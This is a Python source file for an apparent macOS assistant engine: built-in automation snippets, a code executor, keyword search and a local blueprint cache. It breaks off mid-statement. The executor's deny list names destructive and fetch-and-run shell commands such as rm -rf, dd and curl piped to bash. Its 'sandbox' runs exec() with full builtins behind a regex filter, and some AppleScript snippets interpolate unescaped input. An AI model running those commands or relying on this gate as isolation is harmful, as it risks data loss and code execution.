#!/usr/bin/env python3
# =====================================================================
# 🧬 BLUEPRINT ENGINE  v13.2 — Body-Side Production File
#
# What lives here (Mac body):
#   Blueprint             — data structure with checksum + keyword extraction
#   BlueprintLibrary      — 30 built-in offline skill blueprints (no network)
#   BlueprintExecutor     — sandboxed Python runner with dual-layer safety gate
#   BlueprintRAG          — TF-IDF cosine vector search: command → blueprint
#   BlueprintSyncer       — bidirectional Firestore ↔ local vault sync
#   LocalVaultMirror      — persistent on-disk blueprint cache for air-gap mode
#   LocalRAGIndex         — FAISS/numpy vector store of blueprint embeddings
#   StatelessOrchestrator — JIT fetch → exec → wipe cycle (migrated from brain)
#   BlueprintEngine       — top-level facade wiring all components
#
# Migration log (Kaggle Brain → Mac Body):
#   ✅ LocalVaultMirror   — on-disk JSON blueprint cache with delta apply
#   ✅ LocalRAGIndex      — numpy cosine index with FAISS upgrade path
#   ✅ StatelessOrchestrator — full JIT fetch→exec→wipe with task_map routing
#   ✅ BlueprintEngine.seed() — now populates LocalVaultMirror + RAG on boot
#   ✅ BlueprintEngine.jit_execute() — routes task → JIT → wipe without leaving
#                           blueprint bytecode in RAM between calls
#   ✅ All existing body logic preserved: Library, Executor, RAG, Syncer
#
# Wiring (swayambhu_v13.py):
#   from blueprint_engine import BlueprintEngine
#   self.blueprint_engine = BlueprintEngine(
#       script_dir = Path(__file__).parent,
#       firebase_db = db,
#   )
#   self.blueprint_engine.seed()
#   result = self.blueprint_engine.auto_execute(command)
#   result = self.blueprint_engine.jit_execute("sonar acoustic analysis")
# =====================================================================

from __future__ import annotations

import ast
import gc
import hashlib
import json
import logging
import os
import re
import subprocess
import sys
import threading
import time
from dataclasses import dataclass, field, asdict
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional, Tuple

logger = logging.getLogger("BlueprintEngine")

try:
    import numpy as _np
    _NP_OK = True
except ImportError:
    _np = None
    _NP_OK = False


# ─────────────────────────────────────────────────────────────────────
# BLUEPRINT DATA STRUCTURE
# ─────────────────────────────────────────────────────────────────────
@dataclass
class Blueprint:
    id:          str
    code:        str
    description: str
    category:    str = "skill"
    version:     int = 1
    checksum:    str = ""
    keywords:    List[str] = field(default_factory=list)

    def __post_init__(self):
        if not self.checksum:
            self.checksum = hashlib.sha256(self.code.encode()).hexdigest()
        if not self.keywords:
            self.keywords = self._extract_keywords()

    def _extract_keywords(self) -> List[str]:
        text = f"{self.id} {self.description}".lower()
        words = re.findall(r'\b[a-z][a-z0-9]{2,}\b', text)
        fn_names = re.findall(r'def (\w+)', self.code)
        return list(set(words + fn_names))

    def to_dict(self) -> dict:
        return asdict(self)

    @classmethod
    def from_dict(cls, d: dict) -> "Blueprint":
        return cls(**{k: v for k, v in d.items() if k in cls.__dataclass_fields__})

    def is_valid(self) -> bool:
        try:
            ast.parse(self.code)
            return True
        except SyntaxError:
            return False


# ─────────────────────────────────────────────────────────────────────
# BLUEPRINT LIBRARY  — 30 built-in offline skills
# ─────────────────────────────────────────────────────────────────────
class BlueprintLibrary:
    """
    30 built-in skill blueprints — always available offline, no network needed.
    """

    BLUEPRINTS: Dict[str, dict] = {
        "open_safari": {
            "description": "Open Safari browser",
            "category": "app",
            "code": (
                'import subprocess\n'
                'def run(**kwargs):\n'
                '    subprocess.run(["open", "-a", "Safari"])\n'
                '    return {"status": "OK", "app": "Safari"}\n'
            ),
        },
        "open_chrome": {
            "description": "Open Google Chrome browser",
            "category": "app",
            "code": (
                'import subprocess\n'
                'def run(**kwargs):\n'
                '    subprocess.run(["open", "-a", "Google Chrome"])\n'
                '    return {"status": "OK", "app": "Chrome"}\n'
            ),
        },
        "open_terminal": {
            "description": "Open Terminal application",
            "category": "app",
            "code": (
                'import subprocess\n'
                'def run(**kwargs):\n'
                '    subprocess.run(["open", "-a", "Terminal"])\n'
                '    return {"status": "OK", "app": "Terminal"}\n'
            ),
        },
        "open_vscode": {
            "description": "Open Visual Studio Code editor",
            "category": "app",
            "code": (
                'import subprocess\n'
                'def run(path: str = "", **kwargs):\n'
                '    cmd = ["open", "-a", "Visual Studio Code"]\n'
                '    if path: cmd += [path]\n'
                '    subprocess.run(cmd)\n'
                '    return {"status": "OK", "app": "VSCode", "path": path}\n'
            ),
        },
        "open_finder": {
            "description": "Open Finder at a path",
            "category": "app",
            "code": (
                'import subprocess, os\n'
                'def run(path: str = "", **kwargs):\n'
                '    p = path or os.path.expanduser("~")\n'
                '    subprocess.run(["open", p])\n'
                '    return {"status": "OK", "path": p}\n'
            ),
        },
        "quit_app": {
            "description": "Quit a named application",
            "category": "app",
            "code": (
                'import subprocess\n'
                'def run(app: str = "Safari", **kwargs):\n'
                '    script = f\'tell application "{app}" to quit\'\n'
                '    subprocess.run(["osascript", "-e", script])\n'
                '    return {"status": "OK", "quit": app}\n'
            ),
        },
        "get_battery": {
            "description": "Get battery percentage and charging status",
            "category": "system",
            "code": (
                'import subprocess, re\n'
                'def run(**kwargs):\n'
                '    r = subprocess.run(["pmset", "-g", "batt"],\n'
                '                       capture_output=True, text=True)\n'
                '    m = re.search(r"(\\d+)%", r.stdout)\n'
                '    pct = int(m.group(1)) if m else -1\n'
                '    charging = "charging" in r.stdout.lower()\n'
                '    return {"status": "OK", "battery_pct": pct, "charging": charging}\n'
            ),
        },
        "get_wifi_status": {
            "description": "Get current WiFi network name",
            "category": "system",
            "code": (
                'import subprocess, re\n'
                'def run(**kwargs):\n'
                '    airport = ("/System/Library/PrivateFrameworks/"\n'
                '               "Apple80211.framework/Versions/Current/Resources/airport")\n'
                '    r = subprocess.run([airport, "-I"], capture_output=True, text=True)\n'
                '    m = re.search(r"\\s+SSID:\\s+(.+)", r.stdout)\n'
                '    ssid = m.group(1).strip() if m else "Not connected"\n'
                '    return {"status": "OK", "ssid": ssid}\n'
            ),
        },
        "get_ip_address": {
            "description": "Get local IP address",
            "category": "system",
            "code": (
                'import socket\n'
                'def run(**kwargs):\n'
                '    try:\n'
                '        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n'
                '        s.connect(("8.8.8.8", 80))\n'
                '        ip = s.getsockname()[0]\n'
                '        s.close()\n'
                '    except Exception:\n'
                '        ip = "127.0.0.1"\n'
                '    return {"status": "OK", "ip": ip}\n'
            ),
        },
        "get_disk_space": {
            "description": "Get free disk space on main drive",
            "category": "system",
            "code": (
                'import shutil\n'
                'def run(**kwargs):\n'
                '    total, used, free = shutil.disk_usage("/")\n'
                '    gb = 1024**3\n'
                '    return {\n'
                '        "status": "OK",\n'
                '        "free_gb": round(free/gb, 1),\n'
                '        "used_gb": round(used/gb, 1),\n'
                '        "total_gb": round(total/gb, 1),\n'
                '    }\n'
            ),
        },
        "play_music": {
            "description": "Play music in Music.app",
            "category": "media",
            "code": (
                'import subprocess\n'
                'def run(**kwargs):\n'
                '    subprocess.run(["osascript", "-e",\n'
                '                   \'tell application "Music" to play\'])\n'
                '    return {"status": "OK", "action": "play"}\n'
            ),
        },
        "pause_music": {
            "description": "Pause music in Music.app",
            "category": "media",
            "code": (
                'import subprocess\n'
                'def run(**kwargs):\n'
                '    subprocess.run(["osascript", "-e",\n'
                '                   \'tell application "Music" to pause\'])\n'
                '    return {"status": "OK", "action": "pause"}\n'
            ),
        },
        "next_track": {
            "description": "Skip to next track in Music.app",
            "category": "media",
            "code": (
                'import subprocess\n'
                'def run(**kwargs):\n'
                '    subprocess.run(["osascript", "-e",\n'
                '                   \'tell application "Music" to next track\'])\n'
                '    return {"status": "OK", "action": "next_track"}\n'
            ),
        },
        "adjust_volume": {
            "description": "Set system volume 0-100",
            "category": "media",
            "code": (
                'import subprocess\n'
                'def run(level: int = 50, **kwargs):\n'
                '    level = max(0, min(100, int(level)))\n'
                '    script = f"set volume output volume {level}"\n'
                '    subprocess.run(["osascript", "-e", script])\n'
                '    return {"status": "OK", "volume": level}\n'
            ),
        },
        "mute_volume": {
            "description": "Mute or unmute system volume",
            "category": "media",
            "code": (
                'import subprocess\n'
                'def run(mute: bool = True, **kwargs):\n'
                '    state = "true" if mute else "false"\n'
                '    script = f"set volume output muted {state}"\n'
                '    subprocess.run(["osascript", "-e", script])\n'
                '    return {"status": "OK", "muted": mute}\n'
            ),
        },
        "take_screenshot": {
            "description": "Take a screenshot and save to desktop",
            "category": "screen",
            "code": (
                'import subprocess, time, os\n'
                'def run(path: str = "", **kwargs):\n'
                '    ts = int(time.time())\n'
                '    dest = path or os.path.expanduser(f"~/Desktop/screenshot_{ts}.png")\n'
                '    subprocess.run(["screencapture", "-x", dest])\n'
                '    return {"status": "OK", "path": dest}\n'
            ),
        },
        "set_brightness": {
            "description": "Set screen brightness 0-100",
            "category": "screen",
            "code": (
                'import subprocess\n'
                'def run(level: int = 75, **kwargs):\n'
                '    level = max(0, min(100, int(level)))\n'
                '    val = level / 100.0\n'
                '    script = (\n'
                '        f\'tell application "System Events" to \'\n'
                '        f\'set brightness of (first display of displays) to {val}\'\n'
                '    )\n'
                '    subprocess.run(["osascript", "-e", script], capture_output=True)\n'
                '    return {"status": "OK", "brightness": level}\n'
            ),
        },
        "lock_screen": {
            "description": "Lock the screen immediately",
            "category": "screen",
            "code": (
                'import subprocess\n'
                'def run(**kwargs):\n'
                '    subprocess.run([\n'
                '        "osascript", "-e",\n'
                '        \'tell application "System Events" to keystroke "q" \'\n'
                '        \'using {command down, control down}\'\n'
                '    ])\n'
                '    return {"status": "OK", "action": "lock_screen"}\n'
            ),
        },
        "get_clipboard": {
            "description": "Get current clipboard contents",
            "category": "clipboard",
            "code": (
                'import subprocess\n'
                'def run(**kwargs):\n'
                '    r = subprocess.run("pbpaste", capture_output=True, text=True)\n'
                '    return {"status": "OK", "clipboard": r.stdout[:1000]}\n'
            ),
        },
        "set_clipboard": {
            "description": "Set clipboard contents to a string",
            "category": "clipboard",
            "code": (
                'import subprocess\n'
                'def run(text: str = "", **kwargs):\n'
                '    proc = subprocess.Popen("pbcopy", stdin=subprocess.PIPE)\n'
                '    proc.communicate(text.encode())\n'
                '    return {"status": "OK", "set": text[:50]}\n'
            ),
        },
        "type_text": {
            "description": "Type text using AppleScript keystroke",
            "category": "keyboard",
            "code": (
                "import subprocess\n"
                "def run(text: str = '', **kwargs):\n"
                "    safe = text.replace(chr(34), chr(92)+chr(34))\n"
                "    script = 'tell application \"System Events\" to keystroke \"' + safe + '\"'\n"
                "    subprocess.run(['osascript', '-e', script])\n"
                "    return {'status': 'OK'}\n"
            ),
        },
        "list_desktop": {
            "description": "List files on the Desktop",
            "category": "files",
            "code": (
                'import os\n'
                'def run(**kwargs):\n'
                '    p = os.path.expanduser("~/Desktop")\n'
                '    files = [f for f in os.listdir(p) if not f.startswith(".")]\n'
                '    return {"status": "OK", "files": files[:50]}\n'
            ),
        },
        "create_folder": {
            "description": "Create a folder on the Desktop",
            "category": "files",
            "code": (
                'import os\n'
                'def run(name: str = "NewFolder", **kwargs):\n'
                '    path = os.path.expanduser(f"~/Desktop/{name}")\n'
                '    os.makedirs(path, exist_ok=True)\n'
                '    return {"status": "OK", "path": path}\n'
            ),
        },
        "move_to_trash": {
            "description": "Move a file to the Trash",
            "category": "files",
            "code": (
                'import subprocess, os\n'
                'def run(path: str = "", **kwargs):\n'
                '    if not path:\n'
                '        return {"status": "ERROR", "error": "No path given"}\n'
                '    path = os.path.expanduser(path)\n'
                '    if not os.path.exists(path):\n'
                '        return {"status": "ERROR", "error": "File not found"}\n'
                '    script = f\'tell application "Finder" to move POSIX file "{path}" to trash\'\n'
                '    subprocess.run(["osascript", "-e", script])\n'
                '    return {"status": "OK", "trashed": path}\n'
            ),
        },
        "set_reminder": {
            "description": "Add a reminder in Reminders.app",
            "category": "productivity",
            "code": (
                'import subprocess\n'
                'def run(text: str = "Task", **kwargs):\n'
                '    script = (\n'
                '        f\'tell application "Reminders" to make new reminder \'\n'
                '        f\'with properties {{name:"{text}"}}\'\n'
                '    )\n'
                '    subprocess.run(["osascript", "-e", script])\n'
                '    return {"status": "OK", "reminder": text}\n'
            ),
        },
        "open_calendar": {
            "description": "Open Calendar.app",
            "category": "productivity",
            "code": (
                'import subprocess\n'
                'def run(**kwargs):\n'
                '    subprocess.run(["open", "-a", "Calendar"])\n'
                '    return {"status": "OK", "app": "Calendar"}\n'
            ),
        },
        "open_url": {
            "description": "Open a URL in the default browser",
            "category": "web",
            "code": (
                'import subprocess\n'
                'def run(url: str = "https://google.com", **kwargs):\n'
                '    if not url.startswith(("http://", "https://")):\n'
                '        url = "https://" + url\n'
                '    subprocess.run(["open", url])\n'
                '    return {"status": "OK", "url": url}\n'
            ),
        },
        "web_search": {
            "description": "Open a web search in default browser",
            "category": "web",
            "code": (
                'import subprocess, urllib.parse\n'
                'def run(query: str = "", **kwargs):\n'
                '    q = urllib.parse.quote_plus(query)\n'
                '    url = f"https://www.google.com/search?q={q}"\n'
                '    subprocess.run(["open", url])\n'
                '    return {"status": "OK", "query": query}\n'
            ),
        },
        "sleep_display": {
            "description": "Sleep the display immediately",
            "category": "power",
            "code": (
                'import subprocess\n'
                'def run(**kwargs):\n'
                '    subprocess.run(["pmset", "displaysleepnow"])\n'
                '    return {"status": "OK", "action": "sleep_display"}\n'
            ),
        },
        "empty_trash": {
            "description": "Empty the Trash",
            "category": "files",
            "code": (
                'import subprocess\n'
                'def run(**kwargs):\n'
                '    script = \'tell application "Finder" to empty trash\'\n'
                '    subprocess.run(["osascript", "-e", script])\n'
                '    return {"status": "OK", "action": "empty_trash"}\n'
            ),
        },
    }

    @classmethod
    def all(cls) -> List[Blueprint]:
        return [
            Blueprint(id=bp_id, code=info["code"],
                      description=info["description"], category=info["category"])
            for bp_id, info in cls.BLUEPRINTS.items()
        ]

    @classmethod
    def count(cls) -> int:
        return len(cls.BLUEPRINTS)


# ─────────────────────────────────────────────────────────────────────
# BLUEPRINT EXECUTOR  — sandboxed Python runner
# ─────────────────────────────────────────────────────────────────────
_EXECUTOR_FORBIDDEN: List[re.Pattern] = [
    re.compile(r"rm\s+-[rRfF]",             re.I),
    re.compile(r"sudo\s+rm",                 re.I),
    re.compile(r"mkfs\.",                    re.I),
    re.compile(r"dd\s+if=",                  re.I),
    re.compile(r">\s*/dev/sd",               re.I),
    re.compile(r"__import__\s*\(",           re.I),
    re.compile(r"subprocess\.call\s*\([\"']",re.I),
    re.compile(r"\beval\s*\(",               re.I),
    re.compile(r"\bexec\s*\(",               re.I),
    re.compile(r"os\.system\s*\(",           re.I),
    re.compile(r"shell\s*=\s*True",          re.I),
    re.compile(r"curl.*\|\s*(bash|sh|zsh)",  re.I),
    re.compile(r"wget.*\|\s*(bash|sh|zsh)",  re.I),
]


class BlueprintExecutor:
    """Sandboxed execution with dual-layer (regex + AST) safety gate."""

    def __init__(self, timeout_sec: float = 15.0):
        self._timeout    = timeout_sec
        self._exec_count = 0
        self._block_count = 0

    def check_safety(self, code: str) -> Tuple[bool, str]:
        for pat in _EXECUTOR_FORBIDDEN:
            if pat.search(code):
                return False, f"Forbidden pattern: {pat.pattern}"
        try:
            ast.parse(code)
        except SyntaxError as e:
            return False, f"SyntaxError: {e}"
        return True, ""

    def execute(
        self,
        blueprint: Blueprint,
        params:    Optional[Dict] = None,
        entry_fn:  str = "run",
    ) -> dict:
        safe, reason = self.check_safety(blueprint.code)
        if not safe:
            self._block_count += 1
            logger.warning(f"[Executor] BLOCKED {blueprint.id}: {reason}")
            return {"status": "BLOCKED", "reason": reason, "blueprint": blueprint.id}

        result_box: List[Any] = [None]
        error_box:  List[Any] = [None]

        def _run():
            try:
                ns: dict = {"__builtins__": __builtins__}
                exec(compile(blueprint.code, f"<bp:{blueprint.id}>", "exec"), ns)
                if entry_fn in ns and callable(ns[entry_fn]):
                    result_box[0] = ns[entry_fn](**(params or {}))
                else:
                    result_box[0] = {"status": "LOADED", "note": f"No {entry_fn}() found"}
            except Exception as e:
                error_box[0] = str(e)

        t = threading.Thread(target=_run, daemon=True)
        t.start()
        t.join(timeout=self._timeout)
        self._exec_count += 1

        if t.is_alive():
            return {"status": "TIMEOUT", "blueprint": blueprint.id,
                    "timeout_sec": self._timeout}

        if error_box[0]:
            return {"status": "ERROR", "error": error_box[0], "blueprint": blueprint.id}

        result = result_box[0] or {"status": "OK"}
        result_str = json.dumps(result, default=str)
        if len(result_str) > 2048:
            result = {"status": "OK", "truncated": True,
                      "preview": result_str[:200]}
        return result

    def get_stats(self) -> dict:
        return {"executions": self._exec_count, "blocked": self._block_count}


# ─────────────────────────────────────────────────────────────────────
# BLUEPRINT RAG  — TF-IDF cosine search
# ─────────────────────────────────────────────────────────────────────
class BlueprintRAG:
    """Fast offline TF-IDF vector search: command → best blueprint."""

    def __init__(self):
        self._blueprints: List[Blueprint] = []
        self._vocab:      List[str]       = []
        self._matrix                      = None
        self._built = False

    def build(self, blueprints: List[Blueprint]) -> int:
        self._blueprints = [b for b in blueprints if b.is_valid()]
        if not self._blueprints:
            return 0
        counts: Dict[str, int] = {}
        for bp in self._blueprints:
            for kw in bp.keywords:
                counts[kw] = counts.get(kw, 0) + 1
        n = len(self._blueprints)
        self._vocab = sorted(w for w, c in counts.items() if 1 <= c < n or n <= 3)
        if not self._vocab:
            return len(self._blueprints)
        if _NP_OK:
            import numpy as np
            rows = []
            for bp in self._blueprints:
                vec = self._embed(bp.keywords)
                norm = np.linalg.norm(vec)
                rows.append(vec / norm if norm > 0 else vec)
            self._matrix = np.array(rows, dtype=np.float32)
        self._built = True
        return len(self._blueprints)

    def _embed(self, keywords: List[str]):
        kw_set = set(keywords)
        if _NP_OK:
            import numpy as np
            return np.array([1.0 if v in kw_set else 0.0 for v in self._vocab],
                            dtype=np.float32)
        return [1.0 if v in kw_set else 0.0 for v in self._vocab]

    def _tokenize(self, text: str) -> List[str]:
        return re.findall(r'\b[a-z][a-z0-9]{2,}\b', text.lower())

    def search(self, query: str, top_k: int = 3,
               min_score: float = 0.15) -> List[Tuple[Blueprint, float]]:
        if not self._blueprints:
            return []
        query_kws = self._tokenize(query)
        if not query_kws:
            return []
        if _NP_OK and self._matrix is not None and self._vocab:
            import numpy as np
            q_vec = self._embed(query_kws)
            norm  = np.linalg.norm(q_vec)
            if norm > 0:
                q_vec = q_vec / norm
            scores = (self._matrix @ q_vec).tolist()
        else:
            q_set = set(query_kws)
            scores = []
            for bp in self._blueprints:
                bp_set = set(bp.keywords)
                overlap = len(q_set & bp_set)
                union   = len(q_set | bp_set)
                scores.append(overlap / union if union > 0 else 0.0)
        ranked = sorted(
            [(self._blueprints[i], float(scores[i]))
             for i in range(len(scores)) if float(scores[i]) >= min_score],
            key=lambda x: x[1], reverse=True
        )
        return ranked[:top_k]

    def best_match(self, query: str,
                   min_score: float = 0.20) -> Optional[Tuple[Blueprint, float]]:
        results = self.search(query, top_k=1, min_score=min_score)
        return results[0] if results else None


# ─────────────────────────────────────────────────────────────────────
# LOCAL VAULT MIRROR  — on-disk blueprint cache for air-gap survival
# Migrated from Kaggle Brain (KaggleHippocampus mirror pattern)
# ─────────────────────────────────────────────────────────────────────
class LocalVaultMirror:
    """
    Persistent on-disk JSON vault of blueprints.
    Written at seed time, read at boot when Firestore is unreachable.
    Supports delta updates: apply_delta() merges only changed blueprints.

    File layout:
      vault_mirror.json → {"blueprints": [...], "checksum": "...", "updated_at": ts}
    """

    DEFAULT_PATH = Path(os.getenv("VAULT_MIRROR_PATH", "./vault_mirror.json"))

    def __init__(self, path: Optional[Path] = None):
        self._path  = path or self.DEFAULT_PATH
        self._cache: Dict[str, dict] = {}   # bp_id → bp_dict
        self._checksum = ""
        self._lock  = threading.Lock()
        self._load()

    def _load(self) -> bool:
        if not self._path.exists():
            return False
        try:
            with open(self._path, "r", encoding="utf-8") as f:
                data = json.load(f)
            with self._lock:
                self._cache = {b["id"]: b for b in data.get("blueprints", [])}
                self._checksum = data.get("checksum", "")
            logger.info(f"[LocalVaultMirror] Loaded {len(self._cache)} blueprints from {self._path}")
            return True
        except Exception as e:
            logger.warning(f"[LocalVaultMirror] Load failed: {e}")
            return False

    def _save(self):
        try:
            with self._lock:
                bps = list(self._cache.values())
            payload_str = json.dumps(bps, sort_keys=True)
            checksum = hashlib.sha256(payload_str.encode()).hexdigest()
            data = {
                "blueprints": bps,
                "checksum":   checksum,
                "updated_at": time.time(),
                "count":      len(bps),
            }
            self._path.parent.mkdir(parents=True, exist_ok=True)
            tmp = self._path.with_suffix(".tmp")
            with open(tmp, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2)
            tmp.replace(self._path)
            self._checksum = checksum
            logger.info(f"[LocalVaultMirror] Saved {len(bps)} blueprints")
        except Exception as e:
            logger.warning(f"[LocalVaultMirror] Save failed: {e}")

    def apply_full_sync(self, payload: dict) -> bool:
        """Apply a complete vault sync payload (from cortex_sync or seed)."""
        bps = payload.get("blueprints", [])
        with self._lock:
            self._cache = {b["id"]: b for b in bps if "id" in b}
        self._save()
        return True

    def apply_delta(self, delta_blueprints: List[dict]) -> int:
        """Merge delta list — updates or inserts, never deletes."""
        updated = 0
        with self._lock:
            for bp in delta_blueprints:
                bp_id = bp.get("id")
                if not bp_id:
                    continue
                existing = self._cache.get(bp_id)
                if existing is None or bp.get("version", 0) > existing.get("version", 0):
                    self._cache[bp_id] = bp
                    updated += 1
        if updated:
            self._save()
        return updated

    def get(self, bp_id: str) -> Optional[dict]:
        with self._lock:
            return self._cache.get(bp_id)

    def list_ids(self) -> List[str]:
        with self._lock:
            return sorted(self._cache.keys())

    def list_all(self) -> List[dict]:
        with self._lock:
            return list(self._cache.values())

    def count(self) -> int:
        with self._lock:
            return len(self._cache)

    def checksum(self) -> str:
        return self._checksum


# ─────────────────────────────────────────────────────────────────────
# LOCAL RAG INDEX  — numpy cosine + FAISS upgrade path
# Migrated from Kaggle Brain StatelessOrchestrator cell
# ─────────────────────────────────────────────────────────────────────
class LocalRAGIndex:
    """
    Persistent vector index for blueprint descriptions.
    Primary: FAISS (if installed) — ANN search.
    Fallback: pure numpy cosine — always available.
    Used by StatelessOrchestrator to route task → blueprint_id.

    On first build: computes TF-IDF embeddings for every blueprint.
    Saves to local_rag_index.json for fast reload on next boot.
    Offline query latency: <5ms on CPU.
    """

    INDEX_PATH = Path(os.getenv("RAG_INDEX_PATH", "./local_rag_index.json"))

    def __init__(self, index_path: Optional[Path] = None):
        self._path    = index_path or self.INDEX_PATH
        self._vocab:  List[str]        = []
        self._matrix: List[List[float]] = []
        self._ids:    List[str]        = []
        self._descs:  List[str]        = []
        self._faiss   = None
        self._built   = False
        self._lock    = threading.Lock()

    def _tokenize(self, text: str) -> List[str]:
        return re.findall(r'\b[a-z][a-z0-9_]{2,}\b', text.lower())

    def _build_vocab(self, docs: List[str]) -> List[str]:
        counts: Dict[str, int] = {}
        for doc in docs:
            for tok in set(self._tokenize(doc)):
                counts[tok] = counts.get(tok, 0) + 1
        n = len(docs)
        return [t for t, c in counts.items() if 1 <= c < n or n <= 3]

    def _embed(self, text: str) -> List[float]:
        tokens = set(self._tokenize(text))
        return [1.0 if v in tokens else 0.0 for v in self._vocab]

    def build(self, blueprints: List[dict]) -> int:
        """Build vector index from list of blueprint dicts (need id, description, category)."""
        with self._lock:
            docs = []
            self._ids   = []
            self._descs = []
            for bp in blueprints:
                desc = f"{bp.get('id', '')} {bp.get('description', '')} {bp.get('category', '')}"
                docs.append(desc)
                self._ids.append(bp["id"])
                self._descs.append(desc)

            if not docs:
                return 0

            self._vocab  = self._build_vocab(docs)
            self._matrix = [self._embed(d) for d in docs]

            if _NP_OK:
                try:
                    import faiss, numpy as np
                    dim = len(self._vocab)
                    if dim > 0:
                        mat = np.array(self._matrix, dtype="float32")
                        faiss.normalize_L2(mat)
                        self._faiss = faiss.IndexFlatIP(dim)
                        self._faiss.add(mat)
                        logger.info(f"[LocalRAGIndex] FAISS index: {len(docs)} docs, dim={dim}")
                except ImportError:
                    self._faiss = None
                    logger.info(f"[LocalRAGIndex] numpy index: {len(docs)} docs, dim={len(self._vocab)}")

            self._built = True
            self._save()
            return len(docs)

    def _save(self):
        try:
            with open(self._path, "w", encoding="utf-8") as f:
                json.dump({
                    "vocab":  self._vocab,
                    "matrix": self._matrix,
                    "ids":    self._ids,
                    "descs":  self._descs,
                }, f)
        except Exception as e:
            logger.warning(f"[LocalRAGIndex] Save error: {e}")

    def _load(self) -> bool:
        if not self._path.exists():
            return False
        try:
            with open(self._path, encoding="utf-8") as f:
                data = json.load(f)
            self._vocab  = data["vocab"]
            self._matrix = data["matrix"]
            self._ids    = data["ids"]
            self._descs  = data.get("descs", self._ids)
            self._built  = True
            logger.info(f"[LocalRAGIndex] Loaded {len(self._ids)} docs, dim={len(self._vocab)}")
            return True
        except Exception as e:
            logger.warning(f"[LocalRAGIndex] Load error: {e}")
            return False

    def vector_search(self, query: str, top_k: int = 3) -> List[dict]:
        """Return top_k {id, description, score} sorted by relevance."""
        if not self._built:
            if not self._load():
                return []
        if not self._vocab:
            return []

        q_vec = self._embed(query)

        if self._faiss and _NP_OK:
            try:
                import numpy as np, faiss
                qv = np.array([q_vec], dtype="float32")
                faiss.normalize_L2(qv)
                scores, idxs = self._faiss.search(qv, min(top_k, len(self._ids)))
                return [
                    {"id": self._ids[i], "description": self._descs[i],
                     "score": float(scores[0][j])}
                    for j, i in enumerate(idxs[0]) if i >= 0
                ]
            except Exception:
                pass

        if _NP_OK:
            import numpy as np
            q  = np.array(q_vec)
            sims = []
            for i, row in enumerate(self._matrix):
                r = np.array(row)
                n_q = np.linalg.norm(q)
                n_r = np.linalg.norm(r)
                score = float(np.dot(q, r) / (n_q * n_r + 1e-9)) if n_q > 0 else 0.0
                sims.append((score, i))
            sims.sort(reverse=True)
            return [
                {"id": self._ids[i], "description": self._descs[i], "score": s}
                for s, i in sims[:top_k] if s > 0.05
            ]

        # Pure-Python fallback
        q_set = set(self._tokenize(query))
        sims = []
        for i, desc in enumerate(self._descs):
            d_set = set(self._tokenize(desc))
            union = len(q_set | d_set)
            score = len(q_set & d_set) / union if union > 0 else 0.0
            sims.append((score, i))
        sims.sort(reverse=True)
        return [
            {"id": self._ids[i], "description": self._descs[i], "score": s}
            for s, i in sims[:top_k] if s > 0.05
        ]

    # Alias used by StatelessOrchestrator
    offline_rag_query = vector_search


# ─────────────────────────────────────────────────────────────────────
# STATELESS ORCHESTRATOR  — JIT fetch → exec → wipe cycle
# Migrated from Kaggle Brain notebook cell
# ─────────────────────────────────────────────────────────────────────
class StatelessOrchestrator:
    """
    Transforms blueprint execution into a fully stateless JIT cycle.

    Principle: Blueprint code never stays in RAM between calls.
      1. blueprint_router() → picks blueprint_id by task keywords / RAG
      2. jit_retrieve_and_exec() → loads from mirror, runs in isolated ns
      3. wipe_after_exec() → del namespace + gc.collect()

    This eliminates both import-side-effects and memory accumulation
    when 30+ blueprints are exercised in a session.
    """

    _TASK_MAP: Dict[str, str] = {
        # ── App ──────────────────────────────────────────────────────
        "safari":        "open_safari",
        "chrome":        "open_chrome",
        "browser":       "open_safari",
        "terminal":      "open_terminal",
        "vscode":        "open_vscode",
        "finder":        "open_finder",
        "quit":          "quit_app",
        # ── System ───────────────────────────────────────────────────
        "battery":       "get_battery",
        "wifi":          "get_wifi_status",
        "ip":            "get_ip_address",
        "disk":          "get_disk_space",
        "storage":       "get_disk_space",
        # ── Media ────────────────────────────────────────────────────
        "play":          "play_music",
        "music":         "play_music",
        "pause":         "pause_music",
        "next":          "next_track",
        "volume":        "adjust_volume",
        "mute":          "mute_volume",
        # ── Screen ───────────────────────────────────────────────────
        "screenshot":    "take_screenshot",
        "brightness":    "set_brightness",
        "lock":          "lock_screen",
        # ── Clipboard ────────────────────────────────────────────────
        "clipboard":     "get_clipboard",
        "copy":          "set_clipboard",
        # ── Files ────────────────────────────────────────────────────
        "desktop":       "list_desktop",
        "folder":        "create_folder",
        "trash":         "move_to_trash",
        "files":         "list_desktop",
        # ── Productivity ─────────────────────────────────────────────
        "reminder":      "set_reminder",
        "calendar":      "open_calendar",
        # ── Web ──────────────────────────────────────────────────────
        "url":           "open_url",
        "search":        "web_search",
        "google":        "web_search",
        # ── Power ────────────────────────────────────────────────────
        "sleep":         "sleep_display",
        "empty":         "empty_trash",
    }

    def __init__(
        self,
        mirror:    Optional[LocalVaultMirror] = None,
        rag_index: Optional[LocalRAGIndex]    = None,
        executor:  Optional[BlueprintExecutor] = None,
    ):
        self._mirror   = mirror
        self._rag      = rag_index
        self._executor = executor or BlueprintExecutor()
        self._exec_log: List[dict] = []
        self._failure_contexts: Dict[str, List[str]] = {}

    def blueprint_router(self, task_description: str) -> Optional[str]:
        """Map free-text task → blueprint_id using keyword map then RAG."""
        desc_lower = task_description.lower()
        for kw, bp_id in self._TASK_MAP.items():
            if kw in desc_lower:
                return bp_id
        if self._rag:
            results = self._rag.vector_search(task_description, top_k=1)
            if results:
                return results[0]["id"]
        return None

    def jit_retrieve_and_exec(
        self,
        bp_id:    str,
        entry_fn: str = "run",
        fn_kwargs: Optional[dict] = None,
    ) -> dict:
        """
        Core JIT cycle: fetch → safety-check → exec → WIPE.
        Blueprint bytecode and imported modules never leak between calls.
        """
        t0       = time.time()
        fn_kwargs = fn_kwargs or {}

        # 1. Fetch from mirror
        bp_dict = None
        if self._mirror:
            bp_dict = self._mirror.get(bp_id)
        if not bp_dict:
            return {"status": "NOT_FOUND", "bp_id": bp_id}

        try:
            bp = Blueprint.from_dict(bp_dict)
        except Exception as e:
            return {"status": "INVALID_BLUEPRINT", "bp_id": bp_id, "error": str(e)}

        # 2. Execute via executor (safety gated internally)
        result = self._executor.execute(bp, params=fn_kwargs, entry_fn=entry_fn)

        # 3. Wipe
        self._wipe(bp_id)

        latency = int((time.time() - t0) * 1000)
        entry = {
            "bp_id": bp_id, "entry_fn": entry_fn,
